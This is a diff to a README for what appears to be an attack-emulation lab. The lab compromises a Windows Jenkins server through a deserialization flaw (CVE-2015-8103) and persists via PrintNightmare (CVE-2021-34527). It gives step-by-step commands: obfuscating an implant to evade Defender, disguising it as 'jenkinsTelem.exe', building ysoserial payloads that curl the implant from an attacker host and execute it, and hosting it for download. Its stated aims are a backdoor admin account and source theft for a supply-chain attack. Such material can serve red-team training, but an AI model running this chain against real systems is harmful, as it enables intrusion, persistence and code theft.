@@ -5,12 +5,12 @@
 # Info
 - Target             : Windows 10
 - Initial Compromise : Java Deserialization in Jenkins <= 1.638 (CVE-2015-8103)
-- Persistence        : Use Printer Nightmare (CVE-2021-34527) to create backdoor admin account
+- Persistence        : Printer Nightmare (CVE-2021-34527) to create backdoor admin account
 - Purpose            : Exfiltrate source/modify source code for supply chain attack
 
-## Setup vulnerable windows VM
+## Vulnerable Environement Setup
 - Install Windows 10 VM
-- Disable Windows firewall
+- Disable Windows firewall (or at least allow traffic to port 8080 / whatever Jenkins is set to use)
 - Set the following registry values at `HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint`:
     - RestrictDriverInstallationToAdministrators    REG_DWORD    0x0
     - NoWarningNoElevationOnInstall                 REG_DWORD    0x1
@@ -23,21 +23,24 @@
 
 ## Building the Implant
 - `cd` into the `implant/` directory and run `cl implant.c /Os /Fe:implant.exe /Zi`
+    - Note: requires Visual Studio to be installed
 - Run the Alcatraz obfuscator on the implant (https://github.com/weak1337/Alcatraz)
     - Note: Do this in a VM to be safe since Defender flags Alcatraz as malware.
-    - You will need to copy all of the geneated files over(`.pdb, .ilk, .exe` etc...)
-    - In Alcatraz obfuscate all functions, and ensure entrypoint obfuscation is checked
-    - This produces `implant.obfs.exe`, which is the final version
+    - You will need to copy all of the geneated files over before running Alcatraz (`.pdb, .ilk, .exe` etc...)
+    - In Alcatraz, obfuscate all functions, and ensure entrypoint obfuscation is checked
+    - This produces `implant.obfs.exe`
+    - Rename `implant.obs.exe` to `cryptid.exe`
 
 ## Running the Exploit
 - Generate serialized java payload: https://github.com/frohoff/ysoserial
     - `wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar`
-    - Example payload that downloads an implant from 192.168.187.13:8080 and executes it:
-    - `java -jar ysoserial-all.jar CommonsCollections7 "curl 192.168.187.13:8080/implant.exe --output implant.exe && implant.exe" > payload`
-- Python exploit script:
-    - https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
-- Run `python exploit.py [IP] [PORT] /path/to/payload`
-    - Might need to run a few times to get the RCE to work
+    - Example payloads that download an implant from 192.168.187.13:8080 and executes it:
+    - `java -jar ysoserial-all.jar CommonsCollections7 "curl 192.168.187.13:8080/cryptid.exe --output jenkinsTelem.exe"` > download.java
+    - `java -jar ysoserial-all.jar CommonsCollections7 "jenkinsTelem.exe"` > execute.java
+- Python exploit script from https://github.com/gquere/pwn_jenkins/blob/master/rce/jenkins_rce_cve-2015-8103_deser.py
+- Run `python exploit.py [IP] [PORT] /path/to/java/payload`
+    - If you are downloading the implant, make sure you are hosting it on a webserver before you run the exploit
+    - Ex: `python -m http.server 8080`
 - Other Jenkins vulns here:
     - https://github.com/gquere/pwn_jenkins
 
